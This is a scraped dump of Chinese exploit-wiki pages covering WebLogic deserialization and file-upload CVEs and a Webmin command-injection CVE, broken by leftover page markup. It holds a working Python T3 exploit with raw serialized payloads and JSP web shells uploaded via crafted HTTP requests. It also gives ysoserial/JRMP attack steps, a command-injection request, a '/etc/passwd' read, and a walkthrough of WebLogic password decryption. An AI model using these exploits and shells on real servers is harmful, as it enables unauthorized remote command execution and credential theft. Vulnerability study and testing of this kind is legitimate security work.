ByteArrayInputStream的用法： InputStream |__ ByteArrayInputStream OutputStream |__ ByteArrayOutputStream ByteArrayInputStream可以将字节数组转化为输入流。ByteArrayOutputStream可以捕获内存缓冲区的数据，转化成字节数组。 构造函数： public ByteArrayInputStream(byte buf[]) public ByteArrayInputStream(byte buf[], int offset, int length) 注意它需要提供一个byte数组作为缓冲区。 我们通过idea代码窗口内可以看到各个变量在调试运行后的值，var4的值就是接收poc的xml，在 WorkContextXmlInputAdapter var6 = new WorkContextXmlInputAdapter(new ByteArrayInputStream(var4.toByteArray())); 中，要创建WorkContextXmlInputAdapter的实例var6, 则var4.toByteArray()先转换成字节数组，传入ByteArrayInputStream转换成输入流，跟进WorkContextXmlInputAdapter，在WorkContextXmlInputAdapter.class内，WorkContextXmlInputAdapter接收输入流，并将输入流转换成XMLDecoder对象，这时如果再调用XMLDecoder的readObject()方法对其进行反序列化即可造成命令执行。其实在this.receive(var6);中，进行了多层调用最终到达readObject，下面会省略过多无关调试，记录xml反序列化相关： 下面是对WorkContextXmlInputAdapter和创建xml反序列化对象后如何执行的readObject方法造成rce的代码跟踪 WorkContextXmlInputAdapter.class // // Source code recreated from a .class file by IntelliJ IDEA // (powered by Fernflower decompiler) // package weblogic.wsee.workarea; import java.beans.XMLDecoder; import java.io.FileInputStream; import java.io.IOException; import java.io.InputStream; import java.io.NotSerializableException; import weblogic.workarea.WorkContext; import weblogic.workarea.WorkContextInput; public final class WorkContextXmlInputAdapter implements WorkContextInput { private final XMLDecoder xmlDecoder; public WorkContextXmlInputAdapter(InputStream var1) { this.xmlDecoder = new XMLDecoder(var1); // WorkContextXmlInputAdapter构造函数，将输入流转换成XMLDecoder反序列化对象 } public WorkContextXmlInputAdapter(XMLDecoder var1) { this.xmlDecoder = var1; } public String readASCII() throws IOException { return (String)this.xmlDecoder.readObject(); } public WorkContext readContext() throws IOException, ClassNotFoundException { Class var1 = Class.forName(this.readASCII()); try { WorkContext var2 = (WorkContext)var1.newInstance(); var2.readContext(this); return var2; } catch (InstantiationException var3) { throw (IOException)(new NotSerializableException(\"WorkContext must have a public no-arg constructor\")).initCause(var3); } catch (IllegalAccessException var4) { throw (IOException)(new NotSerializableException(\"WorkContext must have a public no-arg constructor\")).initCause(var4); } } public void readFully(byte[] var1) throws IOException { byte[] var2 = (byte[])((byte[])this.xmlDecoder.readObject()); System.arraycopy(var2, 0, var1, 0, var2.length); } public void readFully(byte[] var1, int var2, int var3) throws IOException { byte[] var4 = (byte[])((byte[])this.xmlDecoder.readObject()); System.arraycopy(var4, 0, var1, var2, var3); } public int skipBytes(int var1) throws IOException { throw new UnsupportedOperationException(); } public boolean readBoolean() throws IOException { return (Boolean)this.xmlDecoder.readObject(); } public byte readByte() throws IOException { return (Byte)this.xmlDecoder.readObject(); } public int readUnsignedByte() throws IOException { return (Integer)this.xmlDecoder.readObject(); } public short readShort() throws IOException { return (Short)this.xmlDecoder.readObject(); } public int readUnsignedShort() throws IOException { return (Integer)this.xmlDecoder.readObject(); } public char readChar() throws IOException { return (Character)this.xmlDecoder.readObject(); } public int readInt() throws IOException { return (Integer)this.xmlDecoder.readObject(); } public long readLong() throws IOException { return (Long)this.xmlDecoder.readObject(); } public float readFloat() throws IOException { return (Float)this.xmlDecoder.readObject(); } public double readDouble() throws IOException { return (Double)this.xmlDecoder.readObject(); } public String readLine() throws IOException { return (String)this.xmlDecoder.readObject(); } public String readUTF() throws IOException { return (String)this.xmlDecoder.readObject(); } public static void main(String[] var0) throws Exception { XMLDecoder var1 = new XMLDecoder(new FileInputStream(var0[0])); WorkContextXmlInputAdapter var2 = new WorkContextXmlInputAdapter(var1); System.out.println(var2.readASCII()); System.out.println(var2.readInt()); byte[] var3 = new byte[20]; var2.readFully(var3); System.out.println(var3); System.out.println(var2.readBoolean()); System.out.println(var2.readByte()); System.out.println(var2.readShort()); System.out.println(var2.readChar()); System.out.println(var2.readInt()); System.out.println(var2.readLong()); System.out.println(var2.readFloat()); System.out.println(var2.readDouble()); System.out.println(var2.readUTF()); System.out.println(var2.readUTF()); System.out.println(var2.readUTF()); } } WorkContextXmlInputAdapter->new XMLDecoder(var1) WorkContextEntrylmpl.class public static WorkContextEntry readEntry(WorkContextInput var0) throws IOException, ClassNotFoundException { String var1 = var0.readUTF(); return (WorkContextEntry)(var1.length() == 0 ? NULL_CONTEXT : new WorkContextEntryImpl(var1, var0)); } 第72行，readUTF() WorkContextXmlInputAdapter.class 第103行 public String readUTF() throws IOException { return (String)this.xmlDecoder.readObject(); } 当WorkContextEntrylmpl.class中的readUTF执行完成之后，返回反序列化的字符串，rce也执行完成！8 weglogic log: /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/logs 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-19 12:16:48 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Weblogic/（CVE-2018-2628）.html":{"url":"0day/Weblogic/（CVE-2018-2628）.html","title":"（CVE-2018-2628）","keywords":"","body":"（CVE-2018-2628） 一、漏洞简介 二、漏洞影响 Oracle WebLogic Server10.3.6.0.0 Oracle WebLogic Server12.1.3.0.0 Oracle WebLogic Server12.2.1.2.0 Oracle WebLogic Server12.2.1.3.0 三、复现过程 Usage: cve-2018-2628 127.0.0.1 7001 #!env python #coding=utf-8 import sys import socket import time import re VUL=['CVE-2018-2628'] PAYLOAD=['aced0005737d00000001001d6a6176612e726d692e61637469766174696f6e2e416374697661746f72787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707737000a556e6963617374526566000e3130342e3235312e3232382e353000001b590000000001eea90b00000000000000000000000000000078'] VER_SIG=['\\\\$Proxy[0-9]+'] def t3handshake(sock,server_addr): sock.connect(server_addr) sock.send('74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a'.decode('hex')) time.sleep(1) sock.recv(1024) print 'handshake successful' def buildT3RequestObject(sock,port): data1 = '000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371' data2 = '007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000{0}ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07'.format('{:04x}'.format(dport)) data3 = '1a7727000d3234322e323134' data4 = '2e312e32353461863d1d0000000078' for d in [data1,data2,data3,data4]: sock.send(d.decode('hex')) time.sleep(2) print 'send request payload successful,recv length:%d'%(len(sock.recv(2048))) def sendEvilObjData(sock,data): payload='056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000' payload+=data payload+='fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff' payload = '%s%s'%('{:08x}'.format(len(payload)/2 + 4),payload) sock.send(payload.decode('hex')) time.sleep(2) sock.send(payload.decode('hex')) res = '' try: while True: res += sock.recv(4096) time.sleep(0.1) except Exception as e: pass return res def checkVul(res,server_addr,index): p=re.findall(VER_SIG[index], res, re.S) if len(p)>0: print '%s:%d is vul %s'%(server_addr[0],server_addr[1],VUL[index]) else: print '%s:%d is not vul %s' % (server_addr[0],server_addr[1],VUL[index]) def run(dip,dport,index): sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) ##打了补丁之后，会阻塞，所以设置超时时间，默认15s，根据情况自己调整 sock.settimeout(65) server_addr = (dip, dport) t3handshake(sock,server_addr) buildT3RequestObject(sock,dport) rs=sendEvilObjData(sock,PAYLOAD[index]) print 'rs',rs checkVul(rs,server_addr,index) if __name__==\"__main__\": if len(sys.argv) 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-19 12:17:37 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Weblogic/（CVE-2018-2893）.html":{"url":"0day/Weblogic/（CVE-2018-2893）.html","title":"（CVE-2018-2893）","keywords":"","body":"CVE-2018-2893 一、漏洞简介 二、漏洞影响 三、复现过程 https://github.com/ianxtianxt/CVE-2018-2893 Step 1 java -jar ysoserial-cve-2018-2893.jar WHY SO SERIAL? Usage: java -jar ysoserial-[version]-all.jar [payload] '[command]' Available payload types: Payload Authors Dependencies ------- ------- ------------ JRMPClient @mbechler JRMPClient2 JRMPClient3 JRMPClient4 Jdk7u21 @frohoff Step 2 java -jar ysoserial-cve-2018-2893.jar JRMPClient4 \":\" > poc4.ser Step 3 python weblogic.py poc4.ser 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-19 12:18:02 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Weblogic/（CVE-2018-2894）.html":{"url":"0day/Weblogic/（CVE-2018-2894）.html","title":"（CVE-2018-2894）","keywords":"","body":"（CVE-2018-2894）WebLogic任意文件上传 一、漏洞简介 二、漏洞影响 漏洞影响版本：10.3.6.0, 12.1.3.0, 12.2.1.2, 12.2.1.3 三、复现过程 下载地址：http://download.oracle.com/otn/nt/middleware/12c/12213/fmw_12.2.1.3.0_wls_quick_Disk1_1of1.zip 漏洞复现 服务启动后，访问 http://localhost:7001/ws_utc/config.do 可以将当前的工作目录为更改为其他目录。以本地环境为例，可以部署到 C:\\Oracle\\Middleware\\Oracle_Home\\user_projects\\domains\\base_domain\\servers\\AdminServer\\tmp\\_WL_internal\\com.oracle.webservices.wls.ws-testclient-app-wls\\4mcj4y\\war 选择右边的安全栏目，添加JKS Keystores上传文件。假设chybeta.jsp内容如下： \"); Process p = Runtime.getRuntime().exec(\"cmd.exe /c \" + request.getParameter(\"cmd\")); OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); } } %> 抓包获取到时间戳为1531987145013，则上传到的位置即config\\keystore\\1531987145013_chybeta.jsp 访问http://localhost:7001/ws_utc/config/keystore/1531987145013_chybeta.jsp 简要漏洞分析 在ws-testpage-impl.jar!/com/oracle/webservices/testclient/setting/TestClientWorkDirManager.class:59: public void changeWorkDir(String path) { String[] oldPaths = this.getRelatedPaths(); if (this.testPageProvider.getWsImplType() == ImplType.JRF) { this.isWorkDirChangeable = false; this.isWorkDirWritable = isDirWritable(path); this.isWorkDirChangeable = true; this.setTestClientWorkDir(path); } else { this.persistWorkDir(path); this.init(); } if (this.isWorkDirWritable) { String[] newPaths = this.getRelatedPaths(); moveDirs(oldPaths, newPaths); } else { Logger.fine(\"[INFO] Newly specified TestClient Working Dir is readonly. Won't move the configuration stuff to new path.\"); } } 此函数用于改变工作目录，但其中并未做任何检测。 在ws-testpage-impl.jar!/com/oracle/webservices/testclient/ws/res/SettingResource.class:181中： @Path(\"/keystore\") @POST @Produces({\"application/xml\", \"application/json\"}) @Consumes({\"multipart/form-data\"}) public Response editKeyStoreSettingByMultiPart(FormDataMultiPart formPartParams) { if (!RequestUtil.isRequstedByAdmin(this.request)) { return Response.status(Status.FORBIDDEN).build(); } else { if (TestClientRT.isVerbose()) { Logger.fine(\"calling SettingResource.addKeyStoreSettingByMultiPart\"); } String currentTimeValue = \"\" + (new Date()).getTime(); KeyValuesMap formParams = RSDataHelper.getInstance().convertFormDataMultiPart(formPartParams, true, TestClientRT.getKeyStorePath(), currentTimeValue); .... } } 跟入ws-testpage-impl.jar!/com/oracle/webservices/testclient/core/ws/cdf/config/parameter/TestClientRT.class:31 public static String getKeyStorePath() { return getConfigDir() + File.separator + \"keystore\"; } 得到要写入的路径storePath。 在ws-testpage-impl.jar!/com/oracle/webservices/testclient/ws/util/RSDataHelper.class:145: public KeyValuesMap convertFormDataMultiPart(FormDataMultiPart formPartParams, boolean isExtactAttachment, String path, String fileNamePrefix) { ... if (attachName != null && attachName.trim().length() > 0) { if (attachName != null && attachName.trim().length() != 0) { attachName = this.refactorAttachName(attachName); if (fileNamePrefix == null) { fileNamePrefix = key; } String filename = (new File(storePath, fileNamePrefix + \"_\" + attachName)).getAbsolutePath(); kvMap.addValue(key, filename); if (isExtactAttachment) { this.saveAttachedFile(filename, (InputStream)bodyPart.getValueAs(InputStream.class)); } } } ... } 把上传文件的内容传到了storePath目录里，文件名满足fileNamePrefix + \"_\" + attachName。这过程没有任何过滤和检查：）… 利用条件： 需要知道部署应用的web目录 ws_utc/config.do在开发模式下无需认证，在生产模式下需要认证。具体可见Oracle® Fusion Middleware Administering Web Services 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-05 23:52:45 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Weblogic/（CVE-2018-3191）.html":{"url":"0day/Weblogic/（CVE-2018-3191）.html","title":"（CVE-2018-3191）","keywords":"","body":"（CVE-2018-3191） 一、漏洞简介 二、漏洞影响 weblogic-spring-jndi-12.2.1.3.jar 对于weblogic： 12.2.1.3weblogic-spring-jndi-10.3.6.0.jar 对于weblogic： 10.3.6.012.2.1.012.1.3.012.2.1.1 三、复现过程 http://0-sec.org/download/CVE-2018-3191.zip 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-05 22:27:11 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Weblogic/（CVE-2018-3245）.html":{"url":"0day/Weblogic/（CVE-2018-3245）.html","title":"（CVE-2018-3245）","keywords":"","body":"（CVE-2018-3245） 一、漏洞简介 二、漏洞影响 三、复现过程 https://github.com/ianxtianxt/CVE-2018-3245 Step 1 java -jar ysoserial-cve-2018-3245.jar WHY SO SERIAL? Usage: java -jar ysoserial-cve-2018-3245.jar [payload] '[command]' Available payload types: Payload Authors Dependencies ------- ------- ------------ CVE_2018_2893_1 @mbechler CVE_2018_2893_2 @mbechler CVE_2018_2893_3 @mbechler CVE_2018_3245 @mbechler JRMPClient @mbechler Jdk7u21 @frohoff Step 2 java -jar ysoserial-cve-2018-3245.jar CVE_2018_3245 \"[RMI_SERVICE_IP]:[PORT]\" > poc5.ser Step 3 python weblogic.py [TARGET_HOST] [PORT] poc5.ser 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-05 22:31:08 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Weblogic/（CVE-2019-2618）.html":{"url":"0day/Weblogic/（CVE-2019-2618）.html","title":"（CVE-2019-2618）","keywords":"","body":"cve-2019-2618 一、漏洞简介 Weblogic Upload Vuln(Need username password)-CVE-2019-2618 二、漏洞影响 Oracle WebLogic Server10.3.6.0.0 Oracle WebLogic Server12.1.3.0.0 Oracle WebLogic Server12.2.1.3.0 三、复现过程 https://github.com/ianxtianxt/cve-2019-2618 python使用 python CVE-2019-2618.py url username password 解密weblogic密码 root@f0cb7e674d7e:~/Oracle# cat /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/security/boot.properties |grep pass password={AES}dv/eNBsyg5GcDUbAKaQRheDZhzVk9yiTYVpXlGt9wEU= root@f0cb7e674d7e:~/Oracle# find / -name \"*SerializedSystemIni.dat*\" /root/Oracle/Middleware/user_projects/domains/base_domain/security/SerializedSystemIni.dat root@f0cb7e674d7e:~/Oracle# weblogic 账号密码： weblogic/Oracle@123 使用docker搭建环境 参考vulnhub root@kali:~/vulhub/weblogic/CVE-2017-10271# ls 1.png docker-compose.yml README.md set_mirror.sh root@kali:~/vulhub/weblogic/CVE-2017-10271# docker-compose up -d POST /bea_wls_deployment_internal/DeploymentService HTTP/1.1 Host: 10.10.20.166:7001 Connection: close Accept-Encoding: gzip, deflate Accept: */* User-Agent: python-requests/2.21.0 username: weblogic wl_request_type: app_upload cache-control: no-cache wl_upload_application_name: /../tmp/_WL_internal/bea_wls_internal/9j4dqk/war serverName: Jas502n password: Oracle@123 content-type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW archive: true server_version: 10.3.6.0 wl_upload_delta: true Content-Length: 1081 ------WebKitFormBoundary7MA4YWxkTrZu0gW Content-Disposition: form-data; name=\"shell.jsp\"; filename=\"shell.jsp\" Content-Type: false Commands with JSP \"); Process p; if ( System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") != -1){ p = Runtime.getRuntime().exec(\"cmd.exe /C \" + request.getParameter(\"cmd\")); } else{ p = Runtime.getRuntime().exec(request.getParameter(\"cmd\")); } OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); } } %> ------WebKitFormBoundary7MA4YWxkTrZu0gW-- 也可以换个目录上传 /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/.internal/bea_wls_deployment_internal.war /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/.internal/bea_wls_internal.war 这是上传的路径 /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/bea_wls_internal /root/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/bea_wls_deployment_internal bea_wls_internal bea_wls_deployment_internal 在同目录 这是漏洞war位置 POST /bea_wls_deployment_internal/DeploymentService HTTP/1.1 Host: 10.10.20.166:7001 Connection: close Accept-Encoding: gzip, deflate Accept: */* User-Agent: python-requests/2.21.0 username: weblogic wl_request_type: app_upload cache-control: no-cache wl_upload_application_name: /../tmp/_WL_internal/bea_wls_deployment_internal/gyuitk/war serverName: Jas502n password: Oracle@123 content-type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW archive: true server_version: 10.3.6.0 wl_upload_delta: true Content-Length: 1084 ------WebKitFormBoundary7MA4YWxkTrZu0gW Content-Disposition: form-data; name=\"shell.jsp\"; filename=\"shell111.jsp\" Content-Type: false Commands with JSP \"); Process p; if ( System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") != -1){ p = Runtime.getRuntime().exec(\"cmd.exe /C \" + request.getParameter(\"cmd\")); } else{ p = Runtime.getRuntime().exec(request.getParameter(\"cmd\")); } OutputStream os = p.getOutputStream(); InputStream in = p.getInputStream(); DataInputStream dis = new DataInputStream(in); String disr = dis.readLine(); while ( disr != null ) { out.println(disr); disr = dis.readLine(); } } %> ------WebKitFormBoundary7MA4YWxkTrZu0gW-- 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-19 12:17:07 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Weblogic/（CVE-2019-2725）（CNVD-C-2019-48814）.html":{"url":"0day/Weblogic/（CVE-2019-2725）（CNVD-C-2019-48814）.html","title":"（CVE-2019-2725）","keywords":"","body":"（CVE-2019-2725）（CNVD-C-2019-48814） 一、漏洞简介 二、漏洞影响 三、复现过程 Usage https://github.com/ianxtianxt/CVE-2019-2725 cve2019-2725_weblogic_rce.bat http://192.168.31.5:7001 \"cat /etc/passwd\" 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-05 22:35:55 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Weblogic/（CVE-2019-2890）.html":{"url":"0day/Weblogic/（CVE-2019-2890）.html","title":"（CVE-2019-2890）","keywords":"","body":"（CVE-2019-2890） Weblogic T3 Analysis 一、漏洞简介 二、漏洞影响 三、复现过程 https://github.com/ianxtianxt/CVE-2019-2890 1.导入jar 网上有两篇文章都说了这么个构造思路，但是我阅读学习的时候，死在了导入jar这个难题下，因此在漏洞利用的开头，我列出几个jar文件，测试环境 weblogic 10.3.6 ，可能weblogic 12 jar名字有所不同。 com.bea.core.logging_1.9.0.0.jar com.bea.core.management.core_2.9.0.1.jar com.oracle.core.weblogic.msgcat_1.2.0.0.jar cryptoj.jar glassfish.jaxb_1.1.0.0_2-1-14.jar weblogic.jar wlthint3client.jar 2.重写PersistenContext类 因为需要用到 PersinstenContext 这个类，因此序列化的时候肯定要将其实例化，但是在下图代码位置有个if检查。 在这个if检查的结果会抛出 com.bea.core.security.managers.NotSupportedException 的异常导致反序列化中止。 因此这里解决办法就是绕过它，把它注释掉。 3.改造writeSubject中的writeObject 原先在 writeSubject 中正常写入的对象如下图所示。 这里我们需要将其替换掉，改成我们自己恶意对象，我的做法是构造恶意的JRMP对象。 int sep = command.indexOf(58); String host; int port; if (sep 4.改造加密问题 原先我们看到了，反序列化过程中有个解密过程，所以这里需要加密一下。首先加密过程有个KernelStatus.isServer()的判断。 if (KernelStatus.isServer()) { var5 = EncryptionUtil.encrypt(var5); } 会说我直接改造一下，把if去掉，让他直接EncryptionUtil.encrypt不就好了吗，但是跟进去之后会发现还是有个 Kernel.isServer() 的的判断。 public static byte[] encrypt(byte[] var0) { return Kernel.isServer() ? getEncryptionService().encryptBytes(var0) : var0; } 因此这里需要调用KernelStatus.setIsServer(true);，将状态设置为true。 当然这里还有另一种解法，我们实际上可以直接调用 var5 = EncryptionUtil.getEncryptionService().encryptBytes((byte []) var5); 但是有个小问题 getEncryptionService 是一个 private 方法，你需要重写一个把它变成public就可以直接调用了。 所以我重写了一个 EncryptionUtil ，并且将 getEncryptionService 设置为了 public 。 5.解决加密key的问题 在 weblogic.security.internal.SerializedSystemIni 存在一个加密的key，这个key实际上每个weblogic都不一样，所以官方给这个漏洞评价为授权状态下getshell，也是和之前的T3反序列化不太一样的地方，这里的解决办法就是你要复现那个weblogic，就找到他的 SerializedSystemIni.dat 文件，并且在自己的目录下创建一个 security 目录，放进去就好了。 6.最后一个小问题 在序列化的时候会出现卡死状态的，跟进之后发现原因在weblogic.security.subject.SubjectManager这个类里面。 在这个类里面的 getSubjectManager 方法会有一个 ceClient 的判断，如果为fasle就不会直接返回 ceSubjectManager 对象，因此需要让他为 true 。 而这个鬼东西默认情况下是false。 private static final boolean ceClient = \"true\".equalsIgnoreCase(System.getProperty(\"com.bea.core.internal.client\", \"false\")); 因此只需要System.setProperty(\"com.bea.core.internal.client\",\"true\");让他过去即可。 脚本使用说明 https://github.com/ianxtianxt/CVE-2019-2890 已经将相关jar文件都导入到了项目中，并且利用方式采用yso的JRMP，学习调试时候可以修改利用方式。 首先需要将weblogic下的 SerializedSystemIni.dat 文件放置到 security 文件夹下。 然后需要将yso重命名为 ysoserial.jar ，并且导入到 lib 目录下。 其次 weblogic/wsee/jaxws/persistence/PersistentContext.java 中的 getObject 的IP地址和端口。 try { var3.writeObject(Poc.getObject(\"127.0.0.1:8000\")); } catch (Exception e) { e.printStackTrace(); } 最后远程通过JRMP监听，利用7u21命令执行。 java -cp ysoserial.jar ysoserial.exploit.JRMPListener 8000 Jdk7u21 \"calc.exe\" 使用方法，运行Poc.java生成poc.ser序列化文件，通过 python weblogic.py ip port poc.ser 四、参考链接 https://xz.aliyun.com/t/6904#toc-1 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-14 16:08:04 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Webmin/1.html":{"url":"0day/Webmin/1.html","title":"（CVE-2019-15107）Webmin 远程命令执行漏洞","keywords":"","body":"（CVE-2019-15107）Webmin 远程命令执行漏洞 一、漏洞简介 Webmin是一个用于管理类Unix系统的管理配置工具，具有Web页面。在其找回密码页面中，存在一处无需权限的命令注入漏洞，通过这个漏洞攻击者即可以执行任意系统命令。 二、漏洞影响 Webmin 三、复现过程 环境搭建 执行如下命令，启动webmin 1.910： docker-compose up -d 执行完成后，访问https://0-sec.org:10000，忽略证书后即可看到webmin的登录页面。 复现 参考链接中的数据包是不对的，经过阅读代码可知，只有在发送的user参数的值不是已知Linux用户的情况下（而参考链接中是user=root），才会进入到修改/etc/shadow的地方，触发命令注入漏洞。 发送如下数据包，即可执行命令id： POST /password_change.cgi HTTP/1.1 Host: 0-sec.org:10000 Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0) Connection: close Cookie: redirect=1; testing=1; sid=x; sessiontest=1 Referer: https://your-ip:10000/session_login.cgi Content-Type: application/x-www-form-urlencoded Content-Length: 60 user=rootxx&pam=&expired=2&old=test|id&new1=test2&new2=test2 python usage: python CVE_2019_15107.py https://0-sec.org:10000 cmd C:\\Users\\CTF\\Desktop>python CVE_2019_15107.py https://10.10.20.166:10000 id _______ _______ _______ _______ __ _____ __ _______ __ _______ ______ ( ____ \\|\\ /|( ____ \\ / ___ )( __ )/ \\ / ___ \\ / \\ ( ____ \\/ \\ ( __ )/ ___ \\ | ( \\/| ) ( || ( \\/ \\/ ) || ( ) |\\/) ) ( ( ) ) \\/) ) | ( \\/\\/) ) | ( ) |\\/ ) ) | | | | | || (__ / )| | / | | | ( (___) | | | | (____ | | | | / | / / | | ( ( ) )| __) _/ / | (/ /) | | | \\____ | | | (_____ \\ | | | (/ /) | / / | | \\ \\_/ / | ( / _/ | / | | | | ) | | | ) ) | | | / | | / / | (____/\\ \\ / | (____/\\ ( (__/\\| (__) |__) (_/\\____) ) __) (_/\\____) )__) (_| (__) | / / (_______/ \\_/ (_______/_____\\_______/(_______)\\____/\\______/_____\\____/\\______/ \\____/(_______) \\_/ (_____) (_____) python By jas502n vuln_url= 